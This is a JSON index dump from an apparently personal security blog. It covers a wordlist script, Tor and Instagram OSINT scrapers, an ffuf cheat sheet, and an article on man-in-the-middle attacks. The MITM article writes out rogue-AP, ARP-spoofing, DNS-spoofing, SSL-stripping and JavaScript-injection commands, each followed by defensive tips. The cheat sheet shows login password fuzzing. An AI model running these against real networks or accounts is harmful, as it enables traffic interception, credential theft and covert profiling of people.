workflows.\u003c/p\u003e","title":"SMBMap"},{"content":"Sometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this Wordlist Generator comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\nWhy Bash? You might be asking, why Bash? Well, there’s beauty in simplicity. This script was created to strip down the task to its essentials: no dependencies, no extra fuss, just the native power of Bash. While there are plenty of tools out there for generating wordlists, this one leans into the Unix philosophy—do one thing, and do it well.\nHow It Works The script takes one or more text files as input, extracts the words, normalizes them to lowercase, removes duplicates, sorts them, and outputs everything into a file called wordlist.txt. The end result? A clean, ordered list of unique words ready for your next project.\nKey Features Simple Input: Accepts multiple text files as input. Automatic Sorting: Ensures the wordlist is alphabetically ordered. No Dependencies: Works out of the box with any modern Bash shell. Efficiency: Processes files with a single command pipeline. Getting Started Installation Just grab the script at the bottom of this page, make it executable, and you’re good to go. Or you can get it on my github :\ngit clone https://github.com/noobosaurus-r3x/Wordlister cd Wordlister chmod +x wordlister.sh Usage The script is designed to be intuitive and easy to use. Here’s the basic syntax:\n./wordlister.sh file1.txt file2.txt file3.txt What It Does Combines the contents of all provided text files. Extracts words by splitting on non-alphanumeric characters. Converts all words to lowercase to avoid duplicates like Word and word. Removes duplicates entirely. Outputs the results into wordlist.txt in the current directory. Example Imagine you have two text files, file1.txt and file2.txt, and you want to generate a wordlist:\nRun the script:\n./wordlister.sh file1.txt file2.txt The script processes the files and outputs:\nCreated wordlist with 500 words Open wordlist.txt to see your results.\nNotes If no files are provided, the script will display a usage message and exit. The output file is overwritten each time the script runs, so be sure to back up your previous wordlists if needed. The Script For those who want a peek under the hood, here’s the full script:\n#!/usr/bin/env bash set -euo pipefail IFS=$\u0026#39;\\n\\t\u0026#39; if [ $# -eq 0 ]; then echo \u0026#34;Usage: $0 \u0026lt;text_file1\u0026gt; [\u0026lt;text_file2\u0026gt; ...]\u0026#34; exit 1 fi wordlist=\u0026#34;wordlist.txt\u0026#34; # Process input files to extract unique words in lowercase LC_ALL=C cat \u0026#34;$@\u0026#34; \\ | tr -c \u0026#39;[:alnum:]\u0026#39; \u0026#39;\\n\u0026#39; \\ | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; \\ | sort -u \u0026gt; \u0026#34;$wordlist\u0026#34; word_count=$(wc -l \u0026lt; \u0026#34;$wordlist\u0026#34;) echo \u0026#34;Created wordlist with $word_count words\u0026#34; Why Use This Script? If you need a no-nonsense way to generate a wordlist, this script has you covered. It’s lightweight, fast, and doesn’t require any external tools or libraries. Whether you’re working in cybersecurity, natural language processing, or simply organizing your text data, this Bash script is a reliable companion.\nFinal Thoughts Sometimes the simplest tools are the most effective. This wordlist generator isn’t trying to be fancy; it’s just trying to do the job—and it does it well. If you’ve got improvements or ideas, feel free to tweak the script to fit your needs. After all, the best tools are the ones you make your own.\n","permalink":"http://localhost:1313/tools/wordlister/","summary":"\u003cp\u003eSometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this \u003cstrong\u003eWordlist Generator\u003c/strong\u003e comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\u003c/p\u003e","title":"Wordlister"},{"content":"MITM Attacks: How to Crash the Party Between Alice and Bob Man-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, “Don’t mind me.” Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes tweaking what’s being said.\nToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\nWhat Even Is a Man-in-the-Middle Attack? Picture this: Alice and Bob are exchanging secrets—love letters, memes, bank details, or maybe just complaining about Carol. They think they’re communicating directly, but little do they know, Carol is sitting in the middle, reading every word, tweaking the conversation, and cackling like a villain in a bad spy movie.\nIn the digital world, Alice could be your laptop, Bob a website or server, and Carol a hacker lurking on your café’s Wi-Fi or corporate network. She intercepts traffic, decrypts it (sometimes), and messes with it however she pleases.\nThe terrifying part? This can happen to you without you realizing it—until it’s too late.\nHow Carol Crashes the Party: Common MITM Tricks Carol’s bag of tricks is stuffed with clever (and sometimes shockingly simple) ways to hijack your traffic. Here’s how she pulls it off:\n1. Rogue Wi-Fi Access Points: Carol’s Favorite Honeytrap Setting up a rogue Wi-Fi access point doesn’t require much more than a laptop, a coffee shop corner, and a catchy SSID like Free_Cafe_WiFi or Starbux_Free. You think you’re connecting to free Wi-Fi for your overpriced latte, but you’re actually walking straight into Carol’s trap.\nHow It Works (The Tech Bit): Broadcast the Trap: Carol uses tools like Airbase-ng to create a fake access point. airbase-ng -e \u0026#34;Starbux_Guest\u0026#34; -c 6 wlan0mon Monitor the Victims: Your device connects, trusting the familiar name. Carol now acts as the gateway to the internet. Proxy the Traffic: With tools like ettercap or mitmproxy, Carol routes all your traffic through her machine. She can sniff, modify, or inject malware at will. bettercap -T -q -M arp:remote // // -i wlan0 Optional Evil Fun: Carol can inject JavaScript keyloggers, replace downloads with malware, or redirect DNS queries to phishing pages. Why It’s Effective Devices love auto-connecting to networks they recognize, and humans… well, we love free Wi-Fi.\nDefense Tip: Always use a VPN. It wraps your data in encryption, making Carol’s snooping session as useful as watching a scrambled TV channel from the 90s.\n2. ARP Spoofing: “Hi, I’m the Router Now” ARP (Address Resolution Protocol) is like the phonebook for local networks, mapping IP addresses to MAC addresses. But ARP has a fatal flaw: it trusts everyone. Carol exploits this blind trust to impersonate the router and redirect all traffic through herself.\nHow It Works: Carol tells the router: “Hey, I’m Alice.” Carol tells Alice: “Hey, I’m the router.” Traffic meant for Alice or the router now flows through Carol. arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1 Why It’s Effective On a LAN, ARP spoofing is lightning-fast and stealthy. Carol can:\nSniff unencrypted traffic with Wireshark. Modify requests in real time. Drop packets because chaos is fun. The Tell: On compromised machines, running arp -a often exposes duplicate MAC addresses—a sign Carol’s in the mix.\nDefense Tip: Use ARP detection tools like Arpwatch or enable Dynamic ARP Inspection (DAI) on managed switches.\n3. DNS Spoofing: Carol’s Redirection Magic You type bank.com into your browser. Carol decides that’s cute and redirects you to fak3bank.com—a malicious clone where she harvests your login details.\nHow It Works: Carol intercepts DNS requests (via tools like tcpdump): tcpdump -i eth0 udp port 53 She injects a fake DNS response faster than the real DNS server: dnsspoof -i eth0 -f dns_hosts Example dns_hosts file: 133.7.133.7 google.com You land on Carol’s server, which looks real enough for you to log in like a good, oblivious citizen. Defense Tip: Use DNSSEC to validate DNS responses and encrypt queries with DNS-over-HTTPS (DoH).\n4. SSL Stripping: Downgrading You Back to 2005 You know HTTPS—the comforting padlock in your browser bar? Carol strips it away like a magician revealing a trapdoor.\nHow It Works: You type https://example.com. Carol intercepts and strips the HTTPS headers, forcing a plain old HTTP connection. Everything—passwords, credit card info, embarrassing searches—travels unencrypted. bettercap -iface eth0 -caplet https-ui Carol logs it all. The tiny missing s in HTTPS becomes the gateway to your digital life.\nDefense Tip: Use HSTS (HTTP Strict Transport Security) and browser extensions like HTTPS Everywhere to force secure connections.\n5. HTTPS Spoofing: Fake Certificates, Real Problems If SSL stripping is a blunt hammer, HTTPS spoofing is a precision scalpel. Carol doesn’t remove encryption—she fakes it.\nHow It Works: Carol generates a self-signed SSL certificate to impersonate a legitimate server: openssl req -new -x509 -keyout fakekey.pem -out fakecert.pem She intercepts the connection, swapping the real SSL cert for her fake one. Your browser thinks it’s secure (padlock and all), and Carol decrypts everything. Why It Works Most people trust the padlock icon without ever inspecting the certificate details.\nDefense Tip: Use certificate pinning to reject impostor certificates and manually verify SSL certificates for sensitive services.\nMITM Isn’t Just Eavesdropping—It’s Total Manipulation MITM doesn’t stop at listening. Carol can inject malware, redirect you to phishing sites, or swap out legitimate downloads with compromised files. She can even inject JavaScript into HTTP traffic to keylog everything you type. Tools like Bettercap make this child’s play:\nbettercap -iface eth0 -caplet js-inject Final Thoughts: How to Keep Carol Out MITM attacks exploit trust—trust in open networks, unverified certificates, or unsecured protocols. But with a few defenses, you can kick Carol out of the party:\nAlways use a VPN on public networks. Enable HSTS, DNSSEC, and encrypted DNS (DoH/DoT). Inspect SSL certificates, especially on critical services. Watch for anomalies: duplicate MAC addresses, suspicious DNS redirects, or missing HTTPS. In short: trust no one, especially not the Wi-Fi named Free_Cafe_WiFi. Carol’s out there, latte in hand, waiting for you to slip up. Don’t give her the satisfaction.\n","permalink":"http://localhost:1313/articles/mitm_crash_a_party/","summary":"\u003ch1 id=\"mitm-attacks-how-to-crash-the-party-between-alice-and-bob\"\u003e\u003cstrong\u003eMITM Attacks: How to Crash the Party Between Alice and Bob\u003c/strong\u003e\u003c/h1\u003e\n\u003cp\u003eMan-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, \u003cem\u003e“Don’t mind me.”\u003c/em\u003e Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes \u003cem\u003etweaking\u003c/em\u003e what’s being said.\u003c/p\u003e\n\u003cp\u003eToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\u003c/p\u003e","title":"MITM Attacks"},{"content":"InspecTor: A Streamlined Tool for Website Metadata Extraction Pulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\nTo clarify, I’m not a professional developer, just someone who needed a functional solution when existing tools fell short. Most scrapers I tried either broke on .onion domains or failed to process JavaScript-heavy pages. I created InspecTor to extract emails, links, images, and other relevant data without exposing my IP address. While it’s not perfect, it works and might save you some headaches too.\nWhat Makes InspecTor Stand Out? InspecTor focuses on three core capabilities:\nMetadata Extraction: It retrieves emails, phone numbers, links, images, and other exposed data from websites. Tor Support: Requests are routed through the Tor network, enabling anonymous access to .onion domains and privacy-sensitive sites. Dynamic Content Handling: By leveraging Selenium, InspecTor processes JavaScript-heavy pages that traditional scrapers typically ignore. Combined with multithreading for concurrent URL processing, InspecTor offers an efficient way to gather metadata while avoiding flags or blocks.\nKey Features Anonymous Scraping: Routes all requests through the Tor network for IP anonymity and seamless .onion domain access. Dynamic Content Support: Processes JavaScript-dependent pages using Selenium. Targeted Metadata Extraction: Retrieve specific fields like emails, phone numbers, images, and links. Concurrent Processing: Multithreading allows simultaneous scraping of multiple URLs for improved speed. Flexible Output Formats: Export results to JSON, SQLite, or human-readable formats. Configurable Options: Adjust threading, output fields, SSL verification, and more. Setting Up InspecTor 1. Clone the Repository git clone https://github.com/noobosaurus-r3x/InspecTor.git cd InspecTor 2. Install Dependencies pip install -r requirements.txt 3. Install Tor Ensure Tor is installed and running to route requests.\nsudo apt update sudo apt install tor sudo systemctl start tor 4. Set Up Selenium (Optional for Dynamic Content) Install Chrome and ChromeDriver. Ensure ChromeDriver matches your browser version.\nUsing InspecTor Extract Metadata from Specific URLs Provide single or multiple URLs:\npython3 InspecTor.py -u https://example.com https://example.onion Process a File of URLs Input a list of targets from a file:\npython3 InspecTor.py -f urls.txt Force Tor for All Traffic Route all requests through Tor, even for non-.onion domains:\npython3 InspecTor.py -u https://example.com --force-tor Save Results to JSON or SQLite Export metadata to a file or database:\npython3 InspecTor.py -u https://example.onion -o metadata.json python3 InspecTor.py -u https://example.onion --database metadata.db Extract Specific Fields Focus on targeted data:\npython3 InspecTor.py -u https://example.onion --fields emails links -o contact_info.json Handle JavaScript Content Enable Selenium for scraping JavaScript-dependent pages:\npython3 InspecTor.py -u https://example.onion --use-selenium Example Commands Extract everything: python3 InspecTor.py -u https://example.onion --extract-all -o all_metadata.json Grab emails and phone numbers: python3 InspecTor.py -u https://example.com --fields emails phone_numbers -o contact_info.json Ignore SSL certificate issues: python3 InspecTor.py -u https://example.onion --no-verify-ssl --human-readable Output Formats JSON: Structured file output for further processing. SQLite: Database storage for querying and analysis. Human-Readable: Clean, formatted text output for quick reviews. Notes on Tor and Dynamic Content Tor Requirements: Tor must be running on 127.0.0.1:9050. Selenium Setup: Ensure Chrome and ChromeDriver versions match for dynamic content scraping. SSL Verification: Enabled by default; use --no-verify-ssl to bypass invalid certificates. Threading: Control parallel processing with --max-workers for faster scraping. Why I Built InspecTor InspecTor was born out of necessity. Existing tools often fell short when handling .onion domains or JavaScript-heavy pages. As someone who needed a simple and effective way to extract metadata for OSINT investigations, website audits, and cybersecurity research, I created InspecTor.\nIt’s not perfect, but it works. If it helps you solve a problem, that’s great. If you find ways to improve it, even better.\n\u0026ndash;\n","permalink":"http://localhost:1313/tools/inspector/","summary":"\u003ch2 id=\"inspector-a-streamlined-tool-for-website-metadata-extraction\"\u003eInspecTor: A Streamlined Tool for Website Metadata Extraction\u003c/h2\u003e\n\u003cp\u003ePulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\u003c/p\u003e","title":"InspecTor"},{"content":"Gathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where Osintagram comes in: a simple script I put together to finally get Instagram OSINT working again.\nI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\nWhy Osintagram? If you’ve ever tried to scrape data from Instagram, you’ve probably hit limitations like expired session cookies or blocked API calls. Osintagram addresses these issues by:\nUsing Session Cookies: It requires an Instagram session cookie (sockpuppet accounts recommended). This lets you sidestep some of the traditional hurdles of accessing data. Focusing on Practical OSINT: Instead of bloated features, Osintagram keeps it simple and effective—fetching user data like followers, bio, posts, and more. Actually Working: Unlike older tools that throw errors with Instagram’s new API, this one is tested against modern challenges. Features Profile Information Retrieval: Extract usernames, full names, follower and following counts, posts, biographies, and even external website links. Identify whether the account is private or verified. Secure Session Management: Stores session cookies securely using encryption. Straightforward Command-Line Interface: Easy-to-use commands for data extraction. Randomized User Agents: Mimics browser requests to avoid detection. Setting It Up Installation Clone the repository: git clone https://github.com/noobosaurus-r3x/osintagram.git cd osintagram Install dependencies: pip3 install -r requirements.txt Initial Configuration Osintagram relies on an Instagram session ID. During the setup, you’ll provide this ID (from a browser cookie), and the tool will encrypt and store it securely. Use a sockpuppet account to avoid risks.\nRun the setup command:\npython3 osintagram.py --setup This generates two files:\nconfig.ini: Stores encrypted credentials. secret.key: The encryption key for decrypting session IDs. Now you’re ready to dive into OSINT.\nUsing Osintagram To fetch information about a specific Instagram user, run:\npython3 osintagram.py -u \u0026lt;target_username\u0026gt; Replace \u0026lt;target_username\u0026gt; with the Instagram handle you’re interested in. The tool will return:\nProfile stats (followers, following, posts). Account details (bio, verification status, links). The Tech Behind the Tool Osintagram’s architecture is straightforward but effective:\nSession Management: Handles login sessions securely using encrypted cookies. Randomized User Agents: Rotates user agents to simulate real browser activity. Output Handling: Formats fetched data for clarity using rich for visually appealing results. Key Scripts osintagram.py: The main script that orchestrates everything. setup.py: Encrypts and stores session cookies during the initial setup. instagram_api_handler.py: Handles API interactions to fetch profile data. output_manager.py: Manages formatting and presenting results. encryption_utils.py: Encrypts and decrypts session credentials. user_agent_manager.py: Generates randomized user agents. Limitations and Ethical Considerations Limitations: Requires manual extraction of session cookies. Cannot bypass Instagram’s rate limits or restrictions. Ethical Use: Only use this tool on accounts you have permission to analyze. Misuse of OSINT tools can lead to legal consequences. Credits Osintagram is inspired by Toutatis by Palenath. Huge thanks to Palenath for blazing the trail in Instagram OSINT tooling.\nFinal Thoughts Osintagram isn’t trying to reinvent the wheel—it’s here to fill the gaps left by older tools that couldn’t keep up with Instagram’s changes. Whether you’re an OSINT enthusiast or a researcher, it’s a reliable companion for extracting and analyzing Instagram profile data.\nGive it a shot, adapt it to your needs, and let me know if you run into issues.\n","permalink":"http://localhost:1313/tools/osintagram/","summary":"\u003cp\u003eGathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where \u003cstrong\u003eOsintagram\u003c/strong\u003e comes in: a simple script I put together to finally get Instagram OSINT working again.\u003c/p\u003e\n\u003cp\u003eI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\u003c/p\u003e","title":"Osintagram"},{"content":"FFUF (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\nBasic Syntax ffuf -c -w path/to/wordlist -u https://target_url/FUZZ Examples # Filter responses with a content size of 4242 bytes ffuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u0026#34;Host: FUZZ\u0026#34; -fs 4242 # Filter responses with a 401 status code ffuf -w /path/to/values.txt -u https://target_url/script.php?valid_name=FUZZ -fc 401 # Filter 401 responses and fuzz passwords in a POST request ffuf -w /path/to/postdata.txt -X POST -d \u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34; -u https://target_url/login.php -fc 401 Common Flags -c: Enable colorized output. -maxtime: Set the maximum runtime for the process in seconds. -p: Set a delay between requests (e.g., 0.1 seconds). -v: Verbose output. -t: Number of threads (default is 40). -mc: Match specific HTTP status codes (e.g., 200, 301, 403, or all). -fc: Filter out responses by HTTP status codes. -w: Specify the wordlist path. -u: Define the target URL. -s: Enable silent mode. -recursion: Enable recursive fuzzing. -r: Follow redirects. -o: Output results to a file. -of: Specify output format (e.g., json, html, csv, all). -b: Include cookies in the request. Examples # Match all responses, filter 42-byte answers, output colored and verbose ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v # Fuzz host headers and show only status 200 responses ffuf -w hosts.txt -u https://example.org/ -H \u0026#34;Host: FUZZ\u0026#34; -mc 200 # Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34; ffuf -w entries.txt -u https://example.org/ -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39; -fr \u0026#34;error\u0026#34; # Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34; ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr \u0026#34;VAL\u0026#34; -c Tips and Tricks Interactive Mode: Press Enter while FFUF is running to access interactive features, such as reconfiguring filters or saving the state. Multiple Payloads: Use the FUZZ keyword multiple times in a URL (e.g., https://example.org/path/FUZZ/another_path/FUZZ). Variables in URLs: Specify payload locations using variables (e.g., https://example.org/path/{var1}/another_path/{var2}). ","permalink":"http://localhost:1313/cheat-sheets/ffuf/","summary":"\u003cp\u003e\u003cstrong\u003eFFUF\u003c/strong\u003e (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -c -w path/to/wordlist -u https://target_url/FUZZ\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"examples\"\u003eExamples\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a content size of 4242 bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -fs \u003cspan style=\"color:#ae81ff\"\u003e4242\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a 401 status code\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/values.txt -u https://target_url/script.php?valid_name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eFUZZ -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter 401 responses and fuzz passwords in a POST request\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/postdata.txt -X POST -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34;\u003c/span\u003e -u https://target_url/login.php -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-c\u003c/code\u003e\u003c/strong\u003e: Enable colorized output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-maxtime\u003c/code\u003e\u003c/strong\u003e: Set the maximum runtime for the process in seconds.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p\u003c/code\u003e\u003c/strong\u003e: Set a delay between requests (e.g., \u003ccode\u003e0.1\u003c/code\u003e seconds).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e: Verbose output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t\u003c/code\u003e\u003c/strong\u003e: Number of threads (default is 40).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-mc\u003c/code\u003e\u003c/strong\u003e: Match specific HTTP status codes (e.g., \u003ccode\u003e200\u003c/code\u003e, \u003ccode\u003e301\u003c/code\u003e, \u003ccode\u003e403\u003c/code\u003e, or \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-fc\u003c/code\u003e\u003c/strong\u003e: Filter out responses by HTTP status codes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-w\u003c/code\u003e\u003c/strong\u003e: Specify the wordlist path.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u\u003c/code\u003e\u003c/strong\u003e: Define the target URL.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s\u003c/code\u003e\u003c/strong\u003e: Enable silent mode.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-recursion\u003c/code\u003e\u003c/strong\u003e: Enable recursive fuzzing.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r\u003c/code\u003e\u003c/strong\u003e: Follow redirects.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-o\u003c/code\u003e\u003c/strong\u003e: Output results to a file.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-of\u003c/code\u003e\u003c/strong\u003e: Specify output format (e.g., \u003ccode\u003ejson\u003c/code\u003e, \u003ccode\u003ehtml\u003c/code\u003e, \u003ccode\u003ecsv\u003c/code\u003e, \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-b\u003c/code\u003e\u003c/strong\u003e: Include cookies in the request.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"examples-1\"\u003eExamples\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Match all responses, filter 42-byte answers, output colored and verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs \u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e -c -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz host headers and show only status 200 responses\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w hosts.txt -u https://example.org/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -mc \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w entries.txt -u https://example.org/ -X POST -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type: application/json\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e-d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39;\u003c/span\u003e -fr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eVAL -mr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;VAL\u0026#34;\u003c/span\u003e -c\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"tips-and-tricks\"\u003eTips and Tricks\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eInteractive Mode\u003c/strong\u003e: Press \u003ccode\u003eEnter\u003c/code\u003e while FFUF is running to access interactive features, such as reconfiguring filters or saving the state.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMultiple Payloads\u003c/strong\u003e: Use the \u003ccode\u003eFUZZ\u003c/code\u003e keyword multiple times in a URL (e.g., \u003ccode\u003ehttps://example.org/path/FUZZ/another_path/FUZZ\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVariables in URLs\u003c/strong\u003e: Specify payload locations using variables (e.g., \u003ccode\u003ehttps://example.org/path/{var1}/another_path/{var2}\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e","title":"ffuf"},{"content":"Flask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together FlaskOfCookies, a tool to help you decode, encode, and (if 